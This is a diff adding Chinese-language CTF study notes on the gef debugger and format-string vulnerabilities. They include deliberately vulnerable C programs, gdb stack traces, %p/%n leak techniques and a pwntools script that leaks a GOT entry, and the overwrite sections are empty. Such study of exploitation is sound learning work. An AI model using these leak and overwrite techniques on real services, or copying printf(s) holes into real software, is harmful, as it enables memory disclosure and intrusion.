@@ -36,6 +36,27 @@ checksec --file=filename  # 新版
 
 
 
+## gef
+
+> gef github:   https://github.com/hugsy/gef 
+>
+> 切换pwndbg,peda,gef:    https://www.jianshu.com/p/94a71af2022a
+
+- `GEF` (pronounced ʤɛf - "Jeff") is a set of commands for x86/64, ARM, MIPS, PowerPC and SPARC to assist exploit developers and reverse-engineers when using old school GDB. It provides additional features to GDB using the Python API to assist during the process of dynamic analysis and exploit development.
+- Installation:
+  1. 访问 http://gef.blah.cat/py  ，将其内容保存到文件`~/.gdbinit-gef.py`中
+  2. `echo source ~/.gdbinit-gef.py >> ~/.gdbinit`. 
+
+- 使用gef:  `echo "source ~/.GdbPlugins/gef/gef.py" > ~/.gdbinit`, 然后`~/.gdbinit`内容如下，gdb启动后为使用gef，显示`gef➤ `
+
+```bash
+source /home/kali/.gdbinit-gef.py
+```
+
+
+
+
+
 ## pwndbg
 
 > https://github.com/pwndbg/pwndbg
@@ -54,6 +75,8 @@ Installation:
 > 如何使用pwndbg见 Reverse.md. Dynamic Analysis: pwndbg
 >
 > 实践使用案例见对应writeup
+
+- 在显示stack的时候 中间会有省略 暂时不知道有什么方法能去掉中间省略的部分，有时会影响栈分析，考虑换用gef
 
 
 
@@ -1157,8 +1180,6 @@ addr of format string: Color %s, Number %d, Float, %4.2f # format string 格式�
 
 
 
-
-
 - 常见格式化字符串**输入**函数：
   - scanf
 
@@ -1183,7 +1204,7 @@ addr of format string: Color %s, Number %d, Float, %4.2f # format string 格式�
 ### 格式化字符串漏洞利用
 
 1. 使程序崩溃。 %s 对应的参数地址不合法的概率较大，输入若干个 %s ，栈上不可能每个值都对应了合法的地址，总是会有某个地址可以使得程序崩溃
-2. 查看进程内容。根据 %d，%f 等输出栈上的内容
+2. 查看进程内容。根据 `%d, %f, %08x`等输出栈上的内容
    1. 泄露栈内存
       - 获取某个变量的值
       - 获取某个变量对应地址的内存
@@ -1193,9 +1214,304 @@ addr of format string: Color %s, Number %d, Float, %4.2f # format string 格式�
 
 
 
+#### 泄露内存
+
+通常来说：
+
+1. 利用 `%x` 来获取对应栈的内存，但建议使用 `%p`，可以不用考虑位数的区别
+2. 利用 `%s` 来获取变量所对应地址的内容，只不过有零截断
+3. 利用 `%order$x` 来获取指定参数的值，利用 `%order$s` 来获取指定参数对应地址的内容。order为一数字
 
 
 
+```cpp
+#include <stdio.h>  // leakmemory.c // gcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.c
+int main() {  // 编译时指定了为32bit 格式化字符串函数会根据格式化字符串直接使用栈上自顶向上的变量作为参数
+    char s[100];  // printf(s); 处: warning: format not a string literal and no format arguments [-Wformat-security]
+    int a = 1, b = 0x22222222, c = -1;
+    scanf("%s", s);                             // 在这里输入 %08x.%08x.%08x
+    printf("%08x.%08x.%08x.%s\n", a, b, c, s);  // Output:  00000001.22222222.ffffffff.%08x.%08x.%08x
+    printf(s);
+    return 0;
+}
+```
+- 输入为`%08x.%08x.%08x`时的栈，输出：
+```assembly
+$ gdb leakmemory
+> b printf
+> r # run
+%08x.%08x.%08x      #   scanf("%s", s);   输入 %08x.%08x.%08x 后回车
+Breakpoint 1, __printf (format=0x8048563 "%08x.%08x.%08x.%s\n") at printf.c:28   # 在第1个 printf 处断下
+─────────────────────────────────────────[ stack ]──── # printf("%08x.%08x.%08x.%s\n", a, b, c, s); 的栈
+0xffffccec│+0x00: 0x080484bf  →  <main+84> add esp, 0x20     ← $esp  # 返回地址
+0xffffccf0│+0x04: 0x08048563  →  "%08x.%08x.%08x.%s" # 格式化字符串的地址    printf的第 1 个参数  # 0x8048563
+0xffffccf4│+0x08: 0x00000001      # a = 1     格式化字符串的第 1 个参数  printf的第 2 个参数
+0xffffccf8│+0x0c: 0x22222222      # b = 0x22222222  格式化字符串的第 2 个参数  printf的第 3 个参数
+0xffffccfc│+0x10: 0xffffffff      # c = -1    格式化字符串的第 3 个参数  printf的第 4 个参数
+0xffffcd00│+0x14: 0xffffcd10  →  "%08x.%08x.%08x" # 输入的字符串的地址 s="%08x.%08x.%08x" # 格式化字符串的第 4 个参数  printf的第 5 个参数 
+0xffffcd04│+0x18: 0xffffcd10  →  "%08x.%08x.%08x" # 下一个 printf 函数的格式化字符串 即下一个printf的第 1 个参数
+0xffffcd08│+0x1c: 0x000000c2
+> c # continue
+00000001.22222222.ffffffff.%08x.%08x.%08x  # printf("%08x.%08x.%08x.%s\n", a, b, c, s); 的输出  s="%08x.%08x.%08x"
+Breakpoint 1, __printf (format=0xffffcd10 "%08x.%08x.%08x") at printf.c:28 # 在第2个 printf 处断下
+─────────────────────────────────────────[ stack ]────  # printf(s); 的栈
+0xffffccfc│+0x00: 0x080484ce  →  <main+99> add esp, 0x10     ← $esp
+0xffffcd00│+0x04: 0xffffcd10  →  "%08x.%08x.%08x" # 格式化字符串的地址 printf的第 1 个参数 0xffffcd10
+0xffffcd04│+0x08: 0xffffcd10  →  "%08x.%08x.%08x" # 栈上的 0xffffcd04 及其后的数值分别作为第1,2,3个参数按int型解析，分别输出
+0xffffcd08│+0x0c: 0x000000c2                 # 被解析的第2个int型
+0xffffcd0c│+0x10: 0xf7e8b6bb  →  <handle_intel+107> add esp, 0x10 # 被解析的第3个int型
+0xffffcd10│+0x14: "%08x.%08x.%08x"   ← $eax # "%08x.%08x.%08x" 的首地址
+0xffffcd14│+0x18: ".%08x.%08x"
+0xffffcd18│+0x1c: "x.%08x"
+> c # continue # 输出以下内容后退出 [Inferior 1 (process 57077) exited normally]
+ffffcd10.000000c2.f7e8b6bb  # 这里泄露的是栈上的内存
+```
+
+- 如果换成`%p.%p.%p`，则输入输出为：
+
+```python
+%p.%p.%p # 输入
+00000001.22222222.ffffffff.%p.%p.%p # printf("%08x.%08x.%08x.%s\n", a, b, c, s); 的输出
+0xfff328c0.0xc2.0xf75c46bb # printf(s); 的输出
+```
+
+- 并不是每次得到的结果都一样 ，因为栈上的数据会因为每次分配的内存页不同而有所不同，这是因为栈是不对内存页做初始化的
+- 获取**栈中被视为第 n+1 个参数的值**：(格式化参数里面的 n 指的是该格式化字符串对应的第 n 个输出参数，相对于输出函数来说，是第 n+1 个参数)
+
+```c
+printf("%3$x"); // 获取对于printf函数来说，视为第4个参数的值  //  %2$s 将栈上第3个参数作为字符串输出
+```
+- 输入为`%3$x`时的栈，输出：
+```assembly
+$ gdb leakmemory
+>  b printf
+>  r
+%3$x # 输入
+────────────────────────────────────────[ stack ]──── # printf("%08x.%08x.%08x.%s\n", a, b, c, s); 的栈
+0xffffccec│+0x00: 0x080484bf  →  <main+84> add esp, 0x20     ← $esp
+0xffffccf0│+0x04: 0x08048563  →  "%08x.%08x.%08x.%s" # format string
+0xffffccf4│+0x08: 0x00000001
+0xffffccf8│+0x0c: 0x22222222
+0xffffccfc│+0x10: 0xffffffff
+0xffffcd00│+0x14: 0xffffcd10  →  "%3$x"
+0xffffcd04│+0x18: 0xffffcd10  →  "%3$x"
+0xffffcd08│+0x1c: 0x000000c2
+>  r
+00000001.22222222.ffffffff.%3$x # printf("%08x.%08x.%08x.%s\n", a, b, c, s); 的输出
+─────────────────────────────────────────────────────[ stack ]──── # printf(s); 的栈
+0xffffccfc│+0x00: 0x080484ce  →  <main+99> add esp, 0x10     ← $esp
+0xffffcd00│+0x04: 0xffffcd10  →  "%3$x" # 将会输出对应format string来说第3个参数，相对于printf来说是第4个参数
+0xffffcd04│+0x08: 0xffffcd10  →  "%3$x"
+0xffffcd08│+0x0c: 0x000000c2
+0xffffcd0c│+0x10: 0xf7e8b6bb  →  <handle_intel+107> add esp, 0x10 # 将会被输出的内容 !!! # printf's parameter 4  !!!!!!
+0xffffcd10│+0x14: "%3$x"     ← $eax
+0xffffcd14│+0x18: 0xffffce00  →  0x00000001
+0xffffcd18│+0x1c: 0x000000e0
+>  c  # 输出后退出 [Inferior 1 (process 57442) exited normally]
+f7e8b6bb # 输出的内容为 0xffffcd0c│+0x10: 0xf7e8b6bb 即esp+0x10 为printf的第4个参数 # 确实获得 printf 第 4 个参数所对应的值 f7e8b6bb
+```
+
+
+
+
+
+##### 泄露任意地址的内存
+
+- 上例中 s 是 main 函数的局部变量，所以读取到的内容都是在栈上的。调用输出函数printf时，第一个参数的值其实就是格式化字符串format string的地址
+- 当上例`leakmemory.c`的输入为"%s"，可以看到`printf`的栈上参数 1 和 2 均指向`%s`，第一个`%s`指的是`printf`的格式化字符串地址，而第二个`%s`则是格式化字符串的`%s`对应参数。亦即：第二个`%s`被作为参数传递给第一个作为格式化字符串使用的`%s`
+```assembly
+──────────────────────────────────[ stack ]──── # printf(s); 的栈
+0xffffccfc│+0x00: 0x080484ce  →  <main+99> add esp, 0x10     ← $esp
+0xffffcd00│+0x04: 0xffffcd10  →  0xff007325 ("%s"?) # format string's address # 这个是printf的格式化字符串
+0xffffcd04│+0x08: 0xffffcd10  →  0xff007325 ("%s"?) # char* (address) as format string's 1st parameter # 格式化字符串的第一个参数
+0xffffcd08│+0x0c: 0x000000c2
+0xffffcd0c│+0x10: 0xf7e8b6bb  →  <handle_intel+107> add esp, 0x10
+0xffffcd10│+0x14: 0xff007325 ("%s"?)     ← $eax # "%s" 's address # 既被用作格式化字符串 也被用作格式化字符串的第一个参数
+```
+
+- 由于可以控制该格式化字符串，若知道该格式化字符串在输出函数调用时是第几个参数，就可以通过如下的方式来获取某个指定地址addr的内容。
+
+```c
+printf("addr%k$s"); // 假设格式化字符串相对函数调用为第k个参数 addr要被替换为地址，高概率为不可见字符
+```
+
+- 确定该格式化字符串为第几个参数的方式：
+
+```c
+[tag]%p%p%p%p%p%p...
+```
+
+- 重复某个字符的机器字长来作为tag(32bit ELF下为4byte char)，后面跟上若干`%p`输出栈上的内容，如果内容与tag重复，那么就有很大把握说明该地址是格式化字符串的地址
+
+```bash
+$ ./leakmemory     # [tag]%p%p%p%p%p%p... 方法确定 格式化字符串 是函数的第几个参数
+AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
+00000001.22222222.ffffffff.AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
+AAAA0xffffd3a00xf7fcb4100x80491890x414141410x702570250x702570250x702570250x702570250x702570250x702570250x702570250x8007025(nil)0xf7ffd000(nil)
+```
+
+- `0x41414141`在输出的第五个参数，则为格式化字符串的第4个参数。若输入`%4$s`会造成segmentation fault，是因为尝试将`%4$s`表示的地址`0x73243425`进行解析。vmmap可以查看各个地址段的权限
+
+```assembly
+────────── stack ──── # 输入 AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p 时 # printf(s); 的栈
+0xffffd38c│+0x0000: 0x080491e5  →  <main+115> add esp, 0x10      ← $esp
+0xffffd390│+0x0004: 0xffffd3a0  →  "AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p"
+0xffffd394│+0x0008: 0xffffd3a0  →  "AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p"
+0xffffd398│+0x000c: 0xf7fcb410  →  0x080482b8  →  "GLIBC_2.0"
+0xffffd39c│+0x0010: 0x08049189  →  <main+23> add ebx, 0x2e77
+0xffffd3a0│+0x0014: "AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p"
+0xffffd3a4│+0x0018: "%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p"
+0xffffd3a8│+0x001c: "%p%p%p%p%p%p%p%p%p%p%p%p%p"
+```
+
+
+
+- 输出 scanf 地址的脚本，疑似由于某些额外的保护措施，导致无法输出scanf的地址
+
+```python
+from pwn import *   # 分析 leakmemory.c 的脚本 可以输出 scanf 的地址 # 有效性存疑
+context.log_level = "DEBUG"
+sh = process('./leakmemory')
+leakmemory = ELF('./leakmemory')
+__isoc99_scanf_got = leakmemory.got['__isoc99_scanf']  # __isoc99_scanf 的got表项地址
+print("__isoc99_scanf_got: ", hex(__isoc99_scanf_got))  # __isoc99_scanf_got:  0x804c014
+payload = p32(__isoc99_scanf_got) + b'%4$s'
+print("payload:", payload) # payload: b'\x14\xc0\x04\x08%4$s'
+gdb.attach(sh) # [+] Waiting for debugger: Done
+sh.sendline(payload) # Sent 0x9 bytes: 14 c0 04 08  25 34 24 73  0a  │····│%4$s│·│
+sh.recvuntil(b'%4$s\n')
+temp = sh.recv()
+print("sh.recv(): ", temp, type(temp), len(temp)) # sh.recv():  b'\x14\xc0\x04\x08' <class 'bytes'> 4
+print("hex(u32(temp)): ", hex(u32(temp))) # hex(u32(temp)):  0x804c014
+# print(hex(u32(sh.recv()[4:8])))  # remove the first bytes of __isoc99_scanf@got
+sh.interactive()
+```
+
+- 运行上面的脚本时的输出
+
+```python
+$ python leakmemory.py
+[+] Starting local process './leakmemory' argv=[b'./leakmemory'] : pid 36823
+[DEBUG] PLT 0x8049030 printf
+[DEBUG] PLT 0x8049040 __libc_start_main
+[DEBUG] PLT 0x8049050 __isoc99_scanf
+[*] '/home/kali/CTF/pwn/leakmemory'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+__isoc99_scanf_got:  0x804c014
+payload: b'\x14\xc0\x04\x08%4$s'
+[*] running in new terminal: /usr/bin/gdb -q  "./leakmemory" 36823
+[DEBUG] Launching a new terminal: ['/usr/bin/x-terminal-emulator', '-e', '/usr/bin/gdb -q  "./leakmemory" 36823']
+[+] Waiting for debugger: Done
+[DEBUG] Sent 0x9 bytes:
+    00000000  14 c0 04 08  25 34 24 73  0a                        │····│%4$s│·│
+    00000009
+[DEBUG] Received 0x24 bytes:
+    00000000  30 30 30 30  30 30 30 31  2e 32 32 32  32 32 32 32  │0000│0001│.222│2222│
+    00000010  32 2e 66 66  66 66 66 66  66 66 2e 14  c0 04 08 25  │2.ff│ffff│ff.·│···%│
+    00000020  34 24 73 0a                                         │4$s·│
+    00000024
+[DEBUG] Received 0x4 bytes:
+    00000000  14 c0 04 08                                         │····│
+    00000004
+sh.recv():  b'\x14\xc0\x04\x08' <class 'bytes'> 4
+hex(u32(temp)):  0x804c014
+[*] Switching to interactive mode
+[*] Process './leakmemory' stopped with exit code 0 (pid 36823)
+[*] Got EOF while reading in interactive
+```
+- 上述脚本运行时，会启动gdb，在gdb中下断点，continue，查看栈的变化：
+
+```assembly
+gef➤  b printf   # gdb窗口出来后 首先下断点   # Breakpoint 1 at 0xf7dd8060: file printf.c, line 32.
+gef➤  c #Continuing.
+──────────────────────────────── stack ──── # printf("%08x.%08x.%08x.%s\n", a, b, c, s); 的栈; int a = 1, b = 0x22222222, c = -1;
+0xfff7022c│+0x0000: 0x080491d6  →  <main+100> add esp, 0x20      ← $esp
+0xfff70230│+0x0004: 0x0804a00b  →  "%08x.%08x.%08x.%s\n" # format string
+0xfff70234│+0x0008: 0x00000001
+0xfff70238│+0x000c: 0x22222222
+0xfff7023c│+0x0010: 0xffffffff
+0xfff70240│+0x0014: 0xfff70250  →  0x0804c014  →  0xf7dd9100  →  <__isoc99_scanf+0> call 0xf7ec63a9 <__x86.get_pc_thunk.ax>
+0xfff70244│+0x0018: 0xfff70250  →  0x0804c014  →  0xf7dd9100  →  <__isoc99_scanf+0> call 0xf7ec63a9 <__x86.get_pc_thunk.ax>
+0xfff70248│+0x001c: 0xf7f84410  →  0x080482b8  →  "GLIBC_2.0"
+gef➤  c  # Continuing.
+────────────────────────────────────────── stack ────  # printf(s); 的栈
+0xfff7023c│+0x0000: 0x080491e5  →  <main+115> add esp, 0x10      ← $esp
+0xfff70240│+0x0004: 0xfff70250  →  0x0804c014  →  ...# ...与下一行一样 # format string # 0x804c014 是 scanf 的got表项地址
+0xfff70244│+0x0008: 0xfff70250  →  0x0804c014  →  0xf7dd9100  →  <__isoc99_scanf+0> call 0xf7ec63a9 <__x86.get_pc_thunk.ax>
+0xfff70248│+0x000c: 0xf7f84410  →  0x080482b8  →  "GLIBC_2.0"
+0xfff7024c│+0x0010: 0x08049189  →  <main+23> add ebx, 0x2e77
+0xfff70250│+0x0014: 0x0804c014  →  0xf7dd9100  →  <__isoc99_scanf+0> call 0xf7ec63a9 <__x86.get_pc_thunk.ax> # 0xfff70250 指向这
+0xfff70254│+0x0018: "%4$s"
+0xfff70258│+0x001c: 0xf7fb6900  →  0xf7fb6980  →  0x00000000
+────────────────────────────────────────── trace ────
+[#0] 0xf7dd8060 → __printf(format=0xfff70250 "\024\300\004\b%4$s")
+[#1] 0x80491e5 → main()
+```
+
+- `0x0804c014`是 `scanf` 的got表项地址，可以直接由ELF文件得出，`0xf7dd9100`则是`scanf`的真实地址，由脚本的payload利用格式化字符串漏洞得出。（按ctfwiki描述，脚本输出的应该是`0xf7dd9100`，实际脚本输出为`0x0804c014`）
+
+作为对照，放上ctf-wiki中展示的printf(s); 的栈：
+
+```assembly
+─────────────────────────────────────[ stack ]──── # ctf-wiki 中# printf(s); 的栈
+0xffbbf8dc│+0x00: 0x080484ce  →  <main+99> add esp, 0x10     ← $esp
+0xffbbf8e0│+0x04: 0xffbbf8f0  →  0x0804a014  →  0xf76280c0  →  <__isoc99_scanf+0> push ebp
+0xffbbf8e4│+0x08: 0xffbbf8f0  →  0x0804a014  →  0xf76280c0  →  <__isoc99_scanf+0> push ebp
+0xffbbf8e8│+0x0c: 0x000000c2
+0xffbbf8ec│+0x10: 0xf765c6bb  →  <handle_intel+107> add esp, 0x10
+0xffbbf8f0│+0x14: 0x0804a014  →  0xf76280c0  →  <__isoc99_scanf+0> push ebp  ← $eax
+0xffbbf8f4│+0x18: "%4$s"
+0xffbbf8f8│+0x1c: 0x00000000
+```
+
+- 并不是所有的偏移机器字长的整数倍，都可以直接用相应参数来获取，有时，需要对输入的格式化字符串进行填充，使得想要打印的地址内容的地址位于机器字长整数倍的地址处，类似于：
+- `[padding][addr]`
+
+#### 覆盖内存
+
+- `%n`: 不输出字符，把已经成功输出的字符个数写入对应的整型指针参数所指的变量
+
+
+
+```c
+#include <stdio.h> // overwrite.c // gcc -fno-stack-protector -m32 -o -no-pie overwrite overwrite.c
+int a = 123, b = 456;
+int main() {
+    int c = 789;
+    char s[100];
+    printf("%p\n", &c);
+    scanf("%s", s);
+    printf(s);
+    if (c == 16) {
+        puts("modified c.");
+    } else if (a == 2) {
+        puts("modified a for a small number.");
+    } else if (b == 0x12345678) {
+        puts("modified b for a big number!");
+    }
+    return 0;
+}
+```
+
+
+
+
+
+##### 覆盖栈内存
+
+
+
+
+
+
+
+
+
+##### 覆盖任意地址内存
 
 
 
